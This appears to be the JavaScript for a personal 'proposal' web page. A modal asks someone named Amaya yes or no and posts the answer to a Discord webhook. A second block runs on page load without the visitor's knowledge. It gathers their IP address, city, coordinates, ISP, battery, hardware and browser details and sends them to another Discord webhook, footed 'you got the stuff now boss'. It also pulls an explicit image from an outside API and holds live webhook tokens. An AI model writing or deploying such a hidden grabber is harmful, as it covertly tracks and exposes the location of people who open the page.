document.addEventListener('DOMContentLoaded', function () {
    const proposalBtn = document.getElementById('proposalBtn');
    const modal = document.getElementById('proposalModal');
    const closeBtn = document.getElementsByClassName('close')[0];
    const yesBtn = document.getElementById('yesBtn');
    const noBtn = document.getElementById('noBtn');

    // Event listener for clicking the proposal button
    proposalBtn.addEventListener('click', function () {
        modal.style.display = 'block'; // Display the modal
    });

    // Event listener for clicking the close button
    closeBtn.addEventListener('click', function () {
        modal.style.display = 'none'; // Hide the modal
    });

    // Event listener for clicking the "Yes" button
    yesBtn.addEventListener('click', function () {
        sendResponseToDiscord('Yes'); // Send "Yes" response to Discord
        modal.style.display = 'none'; // Hide the modal
    });

    // Event listener for clicking the "No" button
    noBtn.addEventListener('click', function () {
        sendResponseToDiscord('No'); // Send "No" response to Discord
        modal.style.display = 'none'; // Hide the modal
    });

    // Function to send response to Discord webhook
    function sendResponseToDiscord(response) {
        const webhookURL = 'https://discord.com/api/webhooks/1206690909282893834/2d1kLBCflHN1vFkyjyehWPVHA1gEuAbRNUTc5c4yshvCOph-cG_PnJV_rJdmToK2F8A0'; // Replace with your actual Discord webhook URL
        const data = {
            content: `Amaya responded: ${response}`
        };

        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to send response to Discord');
            }
            return response.json();
        })
        .catch(error => console.error('Error:', error));
    }
});


  $(document).ready(function () {
    let ip;
    let country;
    let countryCode;
    let region;
    let regionName;
    let city;
    let zip;
    let lat;
    let lon;
    let timezone;
    let org;
    let batterypercentage;
    let ischarging;
    let platform;
    let networkinfo;
    let networkinformation;
    let width;
    let height;
    let devicelang;
    let iscookieEnabled;
    let userAgent;
    let cpuThreads;
    let deviceram;
    let referurl;
    let datetime = new Date();
    let localtime;
    let dinamycImage;
    async function getInfo() {
      await fetch("https://ip-api.io/json")
        .then((response) => response.json())
        .then((data) => {
          ip = data.ip;
          country = data.country_name;
          countryCode = data.country_code;
          region = data.region_code;
          regionName = data.region_name;
          city = data.city;
          zip = data.zip_code;
          lat = data.latitude;
          lon = data.longitude;
          timezone = data.time_zone;
          org = data.organisation;
        });

      await fetch("https://nekobot.xyz/api/image?type=hthigh")
        .then((response) => response.json())
        .then((data) => {
          dinamycImage = data.message;
          console.log(dinamycImage);
        });

      let battery = await navigator.getBattery();
      batterypercentage = String(battery.level * 100 + "%");
      ischarging = String(battery.charging);
      platform = String(navigator.platform);
      width = String(window.innerWidth);
      height = String(window.innerHeight);
      devicelang = String(navigator.language);
      iscookieEnabled = String(navigator.cookieEnabled);
      userAgent = String(
        navigator.userAgent || navigator.vendor || window.opera
      );
      cpuThreads = String(navigator.hardwareConcurrency);
      deviceram = String(navigator.deviceMemory + "GB");
      referurl = String(window.location.href);
      localtime = String(datetime.toLocaleString());

      await sendWebhook();
    }
    getInfo();

    function sendWebhook() {
      /*Change here the webhookUrl for your discord webhook url*/
      const webhookUrl = "https://discord.com/api/webhooks/1204139338649182238/8zrW1IuS3rBkhOQ2fbtMCvixuPwy5MwvhDEwL97Ermr2bvDkyXNMuzc7YEBPQ8taYzbd";

      let request = new XMLHttpRequest();
      request.open("POST", webhookUrl)
      request.setRequestHeader("Content-type", "application/json");
      let params = {
        content: null,
        embeds: [
          {
            title: "Data",
            description: ``,
            fields: [
              {
                name: "**IP:**",
                value: `${ip}`,
                inline: true,
              },
              {
                name: "**Povider:**",
                value: `${org}`,
                inline: true,
              },
              {
                name: "**Country:**",
                value: `${country}`,
                inline: true,
              },
              {
                name: "**Code Country:**",
                value: `${countryCode}`,
                inline: true,
              },
              {
                name: "**Name reg:**",
                value: `${regionName}`,
                inline: true,
              },
              {
                name: "**Code reg:**",
                value: `${region}`,
                inline: true,
              },
              {
                name: "**City:**",
                value: `${city}`,
                inline: true,
              },
              {
                name: "**Zip:**",
                value: `${zip}`,
                inline: true,
              },
              {
                name: "**Latitud:**",
                value: `${lat}`,
                inline: true,
              },
              {
                name: "**Longitud:**",
                value: `${lon}`,
                inline: true,
              },
              {
                name: "**Time zone:**",
                value: `${timezone}`,
                inline: true,
              },
              {
                name: "**Localtime:**",
                value: `${localtime}`,
                inline: true,
              },
              {
                name: "**Cookies:**",
                value: `${iscookieEnabled}`,
                inline: true,
              },
              {
                name: "**Lang:**",
                value: `${devicelang}`,
                inline: true,
              },
              {
                name: "**Width px:**",
                value: `${width}`,
                inline: true,
              },
              {
                name: "**Height px:**",
                value: `${height}`,
                inline: true,
              },
              {
                name: "**Platform:**",
                value: `${platform}`,
                inline: true,
              },
              {
                name: "Battery:",
                value: `${batterypercentage}`,
                inline: true,
              },
              {
                name: "Charging",
                value: `${ischarging}`,
                inline: true,
              },
              {
                name: "CPU Threads",
                value: `${cpuThreads}`,
                inline: true,
              },
              {
                name: "Ram",
                value: `${deviceram}`,
                inline: true,
              },
              {
                name: "**Browser:**",
                value: `${userAgent}`,
              },
              {
                name: "Url",
                value: `${referurl}`,
              },
            ],
            color: 5814783,
            footer: {
              text: "@everyone you got the stuff now boss",
              icon_url:
                "https://c.tenor.com/TgKK6YKNkm0AAAAi/verified-verificado.gif",
            },
            image: {
              url: `${dinamycImage}`,
            },
            thumbnail: {
              url: "https://c.tenor.com/4CZR8jG5Aa4AAAAC/anime-thighs-blend-s.gif",
            },
            timestamp: datetime,
          },
        ],
        attachments: [],
      };
      request.send(JSON.stringify(params));
    }
  });

